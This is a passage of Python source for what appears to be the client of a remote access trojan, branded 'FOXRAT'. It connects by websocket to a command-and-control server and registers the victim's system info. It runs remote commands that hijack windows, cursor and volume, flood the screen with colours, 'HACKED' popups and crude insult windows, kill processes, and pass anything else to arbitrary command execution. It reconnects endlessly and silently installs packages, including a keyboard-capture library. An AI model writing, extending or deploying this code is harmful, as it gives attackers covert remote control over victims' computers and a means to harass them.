            import ctypes.wintypes
            def elevator():
                try:
                    hwnd = ctypes.windll.user32.GetForegroundWindow()
                    orig = ctypes.wintypes.RECT()
                    ctypes.windll.user32.GetWindowRect(hwnd, ctypes.byref(orig))
                    for i in range(40):
                        y = orig.top - i * 20
                        ctypes.windll.user32.SetWindowPos(hwnd, 0, orig.left, y, 0, 0, 0x0001)
                        time.sleep(0.05)
                    for i in range(40):
                        y = orig.top - 800 + i * 20
                        ctypes.windll.user32.SetWindowPos(hwnd, 0, orig.left, y, 0, 0, 0x0001)
                        time.sleep(0.05)
                    ctypes.windll.user32.SetWindowPos(hwnd, 0, orig.left, orig.top, 0, 0, 0x0001)
                except: pass
            threading.Thread(target=elevator, daemon=True).start()
            return "elevator started"
        except:
            return "Error: elevator failed"

    elif cmd == "puzzle":
        try:
            import ctypes.wintypes
            def puzzle():
                try:
                    hwnd = ctypes.windll.user32.GetForegroundWindow()
                    pieces = []
                    sw = win32api.GetSystemMetrics(0)
                    sh = win32api.GetSystemMetrics(1)
                    for i in range(10):
                        pieces.append((random.randint(0, sw-200), random.randint(0, sh-200)))
                    for px, py in pieces:
                        ctypes.windll.user32.SetWindowPos(hwnd, 0, px, py, 0, 0, 0x0001)
                        time.sleep(0.3)
                except: pass
            threading.Thread(target=puzzle, daemon=True).start()
            return "puzzle started"
        except:
            return "Error: puzzle failed"

    elif cmd == "dizzy":
        try:
            import ctypes.wintypes
            def dizzy():
                try:
                    for i in range(200):
                        x = int(960 + 100 * ctypes.windll.user32.sin(i * 0.1))
                        y = int(540 + 80 * ctypes.windll.user32.cos(i * 0.15))
                        ctypes.windll.user32.SetCursorPos(x, y)
                        time.sleep(0.015)
                except: pass
            threading.Thread(target=dizzy, daemon=True).start()
            return "dizzy cursor"
        except:
            return "Error: dizzy failed"

    elif cmd == "heartbeat":
        try:
            import ctypes.wintypes
            def heartbeat():
                try:
                    for _ in range(6):
                        for vk in [0xAF, 0xAF, 0xAE, 0xAF, 0xAE, 0xAF]:
                            ctypes.windll.user32.keybd_event(vk, 0, 0, 0)
                            ctypes.windll.user32.keybd_event(vk, 0, 2, 0)
                            time.sleep(0.15)
                        time.sleep(0.5)
                except: pass
            threading.Thread(target=heartbeat, daemon=True).start()
            return "heartbeat volume"
        except:
            return "Error: heartbeat failed"

    elif cmd == "invertcolors":
        try:
            hdc = win32gui.GetDC(0)
            sw = win32api.GetSystemMetrics(0)
            sh = win32api.GetSystemMetrics(1)
            win32gui.BitBlt(hdc, 0, 0, sw, sh, hdc, 0, 0, win32con.DSTINVERT)
            win32gui.ReleaseDC(0, hdc)
            return "colors inverted"
        except:
            return "Error: invertcolors failed"

    elif cmd == "disco":
        try:
            def disco():
                try:
                    colors = [0x0000FF, 0x00FF00, 0xFF0000, 0x00FFFF, 0xFF00FF, 0xFFFF00, 0xFF8800, 0x8800FF]
                    hdc = win32gui.GetDC(0)
                    sw = win32api.GetSystemMetrics(0)
                    sh = win32api.GetSystemMetrics(1)
                    for _ in range(30):
                        color = random.choice(colors)
                        hBrush = ctypes.windll.gdi32.CreateSolidBrush(color)
                        rect = ctypes.wintypes.RECT(random.randint(0, sw-100), random.randint(0, sh-100),
                                                     random.randint(100, sw), random.randint(100, sh))
                        ctypes.windll.user32.FillRect(hdc, ctypes.byref(rect), hBrush)
                        ctypes.windll.gdi32.DeleteObject(hBrush)
                        time.sleep(0.05)
                    win32gui.ReleaseDC(0, hdc)
                except: pass
            threading.Thread(target=disco, daemon=True).start()
            return "disco mode"
        except:
            return "Error: disco failed"

    elif cmd == "rainbow":
        try:
            def rainbow():
                try:
                    colors = [0x0000FF, 0x0055FF, 0x00AAFF, 0x00FFFF, 0x00FFAA, 0x00FF55, 0x00FF00, 0x55FF00, 0xAAFF00, 0xFFFF00, 0xFFAA00, 0xFF5500, 0xFF0000, 0xFF0055, 0xFF00AA, 0xFF00FF, 0xAA00FF, 0x5500FF]
                    hdc = win32gui.GetDC(0)
                    sw = win32api.GetSystemMetrics(0)
                    sh = win32api.GetSystemMetrics(1)
                    for i in range(60):
                        color = colors[i % len(colors)]
                        hBrush = ctypes.windll.gdi32.CreateSolidBrush(color)
                        hPen = win32gui.CreatePen(win32con.PS_SOLID, 3, color)
                        old = win32gui.SelectObject(hdc, hPen)
                        y = int(sh / 2 + 200 * ctypes.windll.user32.sin(i * 0.3))
                        win32gui.MoveToEx(hdc, 0, y)
                        win32gui.LineTo(hdc, sw, y)
                        win32gui.SelectObject(hdc, old)
                        win32gui.DeleteObject(hPen)
                        ctypes.windll.gdi32.DeleteObject(hBrush)
                        time.sleep(0.05)
                    win32gui.ReleaseDC(0, hdc)
                except: pass
            threading.Thread(target=rainbow, daemon=True).start()
            return "rainbow screen"
        except:
            return "Error: rainbow failed"

    elif cmd == "matrix":
        try:
            def matrix():
                try:
                    hdc = win32gui.GetDC(0)
                    sw = win32api.GetSystemMetrics(0)
                    sh = win32api.GetSystemMetrics(1)
                    hFont = ctypes.windll.gdi32.CreateFontW(16, 0, 0, 0, 400, 0, 0, 0, 0, 0, 0, 0, 0, "Consolas")
                    old = win32gui.SelectObject(hdc, hFont)
                    ctypes.windll.gdi32.SetTextColor(hdc, 0x0000FF00)
                    ctypes.windll.gdi32.SetBkColor(hdc, 0)
                    chars = "0123456789ABCDEF"
                    for _ in range(200):
                        x = random.randint(0, sw - 20)
                        y = random.randint(0, sh - 20)
                        ch = random.choice(chars)
                        ctypes.windll.user32.TextOutW(hdc, x, y, ch, 1)
                        time.sleep(0.01)
                    win32gui.SelectObject(hdc, old)
                    win32gui.DeleteObject(hFont)
                    win32gui.ReleaseDC(0, hdc)
                except: pass
            threading.Thread(target=matrix, daemon=True).start()
            return "matrix rain"
        except:
            return "Error: matrix failed"

    elif cmd == "spiral":
        try:
            import ctypes.wintypes
            def spiral():
                try:
                    for i in range(300):
                        r = i * 2
                        x = int(960 + r * ctypes.windll.user32.sin(i * 0.1))
                        y = int(540 + r * ctypes.windll.user32.cos(i * 0.1))
                        ctypes.windll.user32.SetCursorPos(x % 1920, y % 1080)
                        time.sleep(0.005)
                except: pass
            threading.Thread(target=spiral, daemon=True).start()
            return "spiral cursor"
        except:
            return "Error: spiral failed"

    elif cmd == "popups":
        try:
            count = int(args.strip()) if args else 15
            for i in range(min(count, 50)):
                def make_popup(idx=i):
                    try:
                        import tkinter as tk
                        root = tk.Tk()
                        root.title(f"Popup #{idx+1}")
                        root.geometry(f"+{random.randint(10,800)}+{random.randint(10,600)}")
                        root.configure(bg="red")
                        label = tk.Label(root, text=f"YOU ARE #{idx+1} HACKED!", fg="white", bg="red", font=("Arial", 16, "bold"))
                        label.pack(padx=20, pady=20)
                        btn = tk.Button(root, text="OK", command=root.destroy, font=("Arial", 12))
                        btn.pack(pady=10)
                        root.attributes('-topmost', True)
                    except: pass
                threading.Thread(target=make_popup, daemon=True).start()
            return f"{min(count,50)} popups opened"
        except:
            return "Error: popups failed"

    elif cmd == "spamnotepad":
        try:
            count = int(args.strip()) if args else 10
            for _ in range(min(count, 30)):
                def spawn():
                    try:
                        p = subprocess.Popen(["notepad.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                        time.sleep(0.2)
                        text = ''.join(random.choices("HACKED BY FOXRAT\n", k=50))
                        p.stdin.write(text.encode())
                        p.stdin.close()
                    except: pass
                threading.Thread(target=spawn, daemon=True).start()
            return f"{min(count,30)} notepads spawned"
        except:
            return "Error: spamnotepad failed"

    elif cmd == "taskkillall":
        try:
            procs = ["notepad.exe", "calc.exe", "mspaint.exe", "wordpad.exe", "write.exe"]
            killed = 0
            for p in procs:
                r = os.system(f"taskkill /f /im {p} >nul 2>&1")
                if r == 0: killed += 1
            return f"killed {killed} process types"
        except:
            return "Error: taskkillall failed"

    elif cmd == "cursorbig":
        try:
            import ctypes.wintypes
            SIZE = 64
            andMask = bytearray(SIZE * (SIZE // 8))
            xorMask = bytearray(SIZE * (SIZE // 8))
            for y in range(SIZE):
                for x in range(SIZE):
                    byteIdx = y * (SIZE // 8) + x // 8
                    bitIdx = 7 - (x % 8)
                    dx = x - SIZE // 2
                    dy = y - SIZE // 2
                    if dx*dx + dy*dy <= (SIZE//2 - 2)**2:
                        xorMask[byteIdx] |= (1 << bitIdx)
                    else:
                        andMask[byteIdx] |= (1 << bitIdx)
            hCursor = ctypes.windll.user32.CreateCursor(None, 0, 0, SIZE, SIZE, bytes(andMask), bytes(xorMask))
            ctypes.windll.user32.SetCursor(hCursor)
            ctypes.windll.user32.SetSystemCursor(hCursor, 32512)
            return "big cursor"
        except:
            return "Error: cursorbig failed"

    elif cmd == "tiny":
        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            ctypes.windll.user32.SetWindowPos(hwnd, 0, 0, 0, 200, 150, 0x0001)
            return "window shrunk to 200x150"
        except:
            return "Error: tiny failed"

    elif cmd == "hidewindow":
        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            ctypes.windll.user32.ShowWindow(hwnd, 0)
            return "foreground window hidden"
        except:
            return "Error: hidewindow failed"

    elif cmd == "showwindow":
        try:
            hwnds = []
            def cb(hwnd, _):
                if ctypes.windll.user32.IsWindowVisible(hwnd):
                    hwnds.append(hwnd)
                return True
            ctypes.windll.user32.EnumWindows(cb, 0)
            for h in hwnds:
                try: ctypes.windll.user32.ShowWindow(h, 5)
                except: pass
            return f"showed {len(hwnds)} windows"
        except:
            return "Error: showwindow failed"

    elif cmd == "cdrom":
        try:
            import winsound as ws
            for _ in range(3):
                os.system("powershell -Command \"$eject = New-Object -ComObject Shell.Application; $eject.NameSpace(17).InvokeVerb('Eject')\"")
                time.sleep(1)
                os.system("powershell -Command \"$close = New-Object -ComObject Shell.Application; $close.NameSpace(17).InvokeVerb('Close')\"")
                time.sleep(1)
            return "cdrom toggled"
        except:
            return "Error: cdrom failed"

    elif cmd == "blue":
        try:
            hdc = win32gui.GetDC(0)
            sw = win32api.GetSystemMetrics(0)
            sh = win32api.GetSystemMetrics(1)
            hBrush = ctypes.windll.gdi32.CreateSolidBrush(0x00FF0000)
            ctypes.windll.user32.FillRect(hdc, ctypes.byref(ctypes.wintypes.RECT(0, 0, sw, sh)), hBrush)
            ctypes.windll.gdi32.DeleteObject(hBrush)
            win32gui.ReleaseDC(0, hdc)
            return "blue screen"
        except:
            return "Error: blue failed"

    elif cmd == "green":
        try:
            hdc = win32gui.GetDC(0)
            sw = win32api.GetSystemMetrics(0)
            sh = win32api.GetSystemMetrics(1)
            hBrush = ctypes.windll.gdi32.CreateSolidBrush(0x0000FF00)
            ctypes.windll.user32.FillRect(hdc, ctypes.byref(ctypes.wintypes.RECT(0, 0, sw, sh)), hBrush)
            ctypes.windll.gdi32.DeleteObject(hBrush)
            win32gui.ReleaseDC(0, hdc)
            return "green screen"
        except:
            return "Error: green failed"

    elif cmd == "redscreen":
        try:
            hdc = win32gui.GetDC(0)
            sw = win32api.GetSystemMetrics(0)
            sh = win32api.GetSystemMetrics(1)
            hBrush = ctypes.windll.gdi32.CreateSolidBrush(0x000000FF)
            ctypes.windll.user32.FillRect(hdc, ctypes.byref(ctypes.wintypes.RECT(0, 0, sw, sh)), hBrush)
            ctypes.windll.gdi32.DeleteObject(hBrush)
            win32gui.ReleaseDC(0, hdc)
            return "red screen"
        except:
            return "Error: redscreen failed"

    elif cmd == "white":
        try:
            hdc = win32gui.GetDC(0)
            sw = win32api.GetSystemMetrics(0)
            sh = win32api.GetSystemMetrics(1)
            hBrush = ctypes.windll.gdi32.CreateSolidBrush(0x00FFFFFF)
            ctypes.windll.user32.FillRect(hdc, ctypes.byref(ctypes.wintypes.RECT(0, 0, sw, sh)), hBrush)
            ctypes.windll.gdi32.DeleteObject(hBrush)
            win32gui.ReleaseDC(0, hdc)
            return "white screen"
        except:
            return "Error: white failed"

    elif cmd == "elite":
        try:
            import tkinter as tk
            from tkinter import font as tkfont
            messages = [
                "Suck me sideways, bro AHAHAAH XDD",
                "Suck my left nut, right one's busy XDD AHAHAAH",
                "Suck me through a straw, coward AHAHAAH XDD",
                "Suck my big toe, little one's tired XDD AHAHAAH",
                "Suck my Wi-Fi signal, it's faster than you AHAHAAH",
                "Suck my 404 error, bro XDD AHAHAAH",
                "Suck me gently, I'm fragile XDD AHAHAAH",
                "Suck my future kids, idc AHAHAAH XDD",
                "Suck my airpods case, it's empty anyway XDD",
                "Suck my keyboard, the W key is broken AHAHAAH",
                "Suck my fridge, it's full of disappointment XDD",
                "Suck my gaming chair, it carries harder than you AHAHAAH",
                "Suck my left sock, right one has holes XDD",
                "Suck my pizza slice, it's cold like your jokes AHAHAAH",
                "Suck my toaster, it has more brain cells XDD",
                "Your brain is buffering since 2005 AHAHAAH XDD",
                "You have negative IQ, congrats bro XDD AHAHAAH",
                "Your last brain cell just quit without notice AHAHAAH",
                "Bro thinks 2+2 is a fish XDD AHAHAAH",
                "You're the human version of a blue screen AHAHAAH",
                "Your thoughts are loading... forever XDD",
                "Did your brain crash? Need a reboot? AHAHAAH",
                "You're not stupid, you're advanced stupid XDD",
                "Bro's IQ is room temperature in Celsius AHAHAAH",
                "Your mirror asked for a refund XDD AHAHAAH",
                "You have the IQ of a wet napkin AHAHAAH XDD",
                "Bro, your brain is on airplane mode XDD AHAHAAH",
                "Even Siri is embarrassed by you AHAHAAH",
                "Your logic is like a broken pencil — pointless XDD",
                "You're the reason idiot was invented AHAHAAH",
                "You look like a potato in a tuxedo AHAHAAH XDD",
                "Your face made my phone lag XDD AHAHAAH",
                "Bro looks like a melted candle on a birthday cake AHAHAAH",
                "Even your shadow left you for someone else XDD",
                "You look like a Minecraft villager on energy drinks AHAHAAH",
                "Your barber hates you, I can see it XDD",
                "Bro's face is a jump-scare in a horror movie AHAHAAH",
                "You're built like a fridge with toothpick legs XDD",
                "Even your mom zooms out to look at you AHAHAAH",
                "You look like a glitch in the Matrix XDD",
                "Bro looks like he was drawn from memory AHAHAAH",
                "Your face is the reason mirrors crack XDD",
                "You're the ugly cousin in every family AHAHAAH",
                "Bro looks like a burned toast XDD",
                "Even your hairstyle is asking for help AHAHAAH",
                "Your aim is a war crime, bro AHAHAAH XDD",
                "Bro misses shots in real life too XDD AHAHAAH",
                "You play like you have no hands and one eye AHAHAAH",
                "Even bots laugh at your gameplay XDD",
                "Your K/D is negative in real life AHAHAAH",
                "Bro can't even beat the tutorial XDD AHAHAAH",
                "You're the final boss of noobs AHAHAAH XDD",
                "Your gaming chair asked for a transfer XDD AHAHAAH",
                "Bro's reflexes are from the 1900s AHAHAAH",
                "You got hard-carried by a potato XDD",
                "Your accuracy is a comedy show AHAHAAH",
                "Bro is the reason easy exists XDD",
                "You're the bot that bots laugh at AHAHAAH",
                "Even your crosshair is confused XDD",
                "Bro, your APM is lower than your IQ AHAHAAH",
                "You're a walking side quest with no reward AHAHAAH XDD",
                "Bro is the NPC of his own life XDD AHAHAAH",
                "Your opinion is like a wet sock — useless AHAHAAH",
                "Bro's vibes are expired since 2010 XDD",
                "You're the WiFi of people — weak and disconnected AHAHAAH",
                "I'd roast you, but my oven is broken XDD",
                "Bro is a typo in human form AHAHAAH",
                "You're Error 404 of existence XDD",
                "Even Google can't find your value AHAHAAH",
                "Bro's aura is negative infinity XDD",
                "You're the skip button of humanity AHAHAAH",
                "Bro's life is a glitch in the simulation XDD",
                "You're a bug, not a feature AHAHAAH",
                "Even your pet ignores you, bro XDD",
                "You're like a cloud — fluffy but useless AHAHAAH",
                "Cry about it, then cry more AHAHAAH XDD",
                "Your tears fuel my energy XDD AHAHAAH",
                "Mad? Good. Stay mad forever AHAHAAH",
                "Saltier than the Dead Sea, bro XDD",
                "Your anger is my daily cardio AHAHAAH",
                "Keep coping, I'll keep gloating XDD",
                "Bro wrote a whole essay, I wrote lol AHAHAAH",
                "Seethe, cope, dilate — in that order XDD",
                "Your rage is my morning coffee AHAHAAH",
                "Stay pressed like a panini, bro XDD",
                "Your tears are delicious, keep crying AHAHAAH",
                "Mad cuz bad, stay bad XDD",
                "Bro is saltier than my chips AHAHAAH",
                "Cry me a river, then drown in it XDD",
                "Your cope is showing, bro AHAHAAH",
                "L + ratio + you're stale AHAHAAH XDD",
                "EZ clap, baby XDD AHAHAAH",
                "Skill issue, get good AHAHAAH",
                "Cry is free, use it XDD",
                "No cap, you're straight trash AHAHAAH",
                "GG no re, loser XDD",
                "Bro is a walking L AHAHAAH",
                "Negative aura, bro XDD",
                "Get clapped and stay clapped AHAHAAH",
                "Womp womp, cope harder XDD AHAHAAH",
                "Соси, но по-русски, бро XDD AHAHAAH",
                "Ты тупее, чем моя бабушка с интернетом AHAHAAH",
                "Бро, ты — как борщ без свеклы XDD",
                "Иди поплачь в подушку, бро AHAHAAH",
                "Твоя мама до сих пор стирает тебе носки XDD",
            ]
            colors = [
                '#FF0000', '#00FF00', '#0000FF', '#FFFF00', '#FF00FF', '#00FFFF',
                '#FF8800', '#8800FF', '#FF0088', '#00FF88', '#88FF00', '#0088FF',
                '#FF4444', '#44FF44', '#4444FF', '#FFAA00', '#AA00FF', '#00AAFF',
                '#FF00AA', '#AAFF00', '#FF6600', '#6600FF', '#00FF66', '#FF3399',
            ]
            def show_elite():
                try:
                    root = tk.Tk()
                    root.withdraw()
                    sw = root.winfo_screenwidth()
                    sh = root.winfo_screenheight()
                    root.destroy()
                except:
                    sw, sh = 1920, 1080
                def spawn_window(idx):
                    try:
                        win = tk.Tk()
                        win.title("ELITE ROAST")
                        msg = messages[idx % len(messages)]
                        color = colors[idx % len(colors)]
                        x = random.randint(50, max(100, sw - 500))
                        y = random.randint(50, max(100, sh - 200))
                        win.geometry(f"+{x}+{y}")
                        win.configure(bg='black')
                        win.attributes('-topmost', True)
                        lf = tkfont.Font(family="Consolas", size=random.randint(14, 24), weight="bold")
                        label = tk.Label(win, text=msg, fg=color, bg='black', font=lf, wraplength=450, padx=20, pady=15)
                        label.pack()
                        win.after(4000, win.destroy)
                    except: pass
                for i in range(20):
                    threading.Thread(target=spawn_window, args=(i,), daemon=True).start()
                    time.sleep(0.3)
            threading.Thread(target=show_elite, daemon=True).start()
            return "elite roasts deployed"
        except:
            return "Error: elite failed"

    else:
        return exec_command(cmd_str)

def on_message(ws, message):
    try:
        msg = json.loads(message)
        if msg.get("type") == "command":
            cmd = msg.get("cmd", "")
            seq = msg.get("seq", "")
            result = handle_command(cmd)
            send_cmd_result(result, seq)
        elif msg.get("type") == "registered":
            global client_id
            client_id = msg.get("id", client_id)
    except Exception as ex:
        pass

def on_open(ws):
    global client_id
    info = get_system_info()
    send_msg({
        "type": "register",
        "id": client_id,
        "account": ACCOUNT,
        "info": info
    })

def on_close(ws, close_status_code, close_msg):
    time.sleep(3)
    connect()

def on_error(ws, error):
    time.sleep(1)

def connect():
    global ws, client_id
    if not client_id:
        client_id = gen_id()
    while True:
        try:
            ws = websocket.WebSocketApp(
                f"ws://{SERVER_HOST}:{SERVER_PORT}",
                on_open=on_open,
                on_message=on_message,
                on_close=on_close,
                on_error=on_error
            )
            ws.run_forever(ping_interval=20, ping_timeout=10)
        except Exception as e:
            pass
        time.sleep(3)

if __name__ == "__main__":
    try:
        import psutil
    except:
        subprocess.run("pip install psutil pillow pynput pywin32 websocket-client pyttsx3 requests", shell=True)

    if len(sys.argv) >= 3:
        SERVER_HOST = sys.argv[1]
        SERVER_PORT = int(sys.argv[2])
    if len(sys.argv) >= 4:
        ACCOUNT = sys.argv[3]

    connect()
